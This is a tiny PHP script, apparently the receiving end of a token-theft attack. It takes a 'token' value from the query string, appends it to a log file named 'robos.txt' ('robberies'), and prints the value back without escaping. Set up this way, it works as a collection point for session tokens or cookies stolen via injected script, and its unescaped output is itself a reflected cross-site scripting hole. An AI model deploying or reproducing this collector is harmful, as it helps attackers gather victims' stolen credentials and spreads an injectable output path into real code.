<?php
    $myfile = fopen("robos.txt", "a");
    $message = $_GET['token']."\n";
    echo $message;
    fwrite($myfile, $message);
    fclose($myfile);
?>
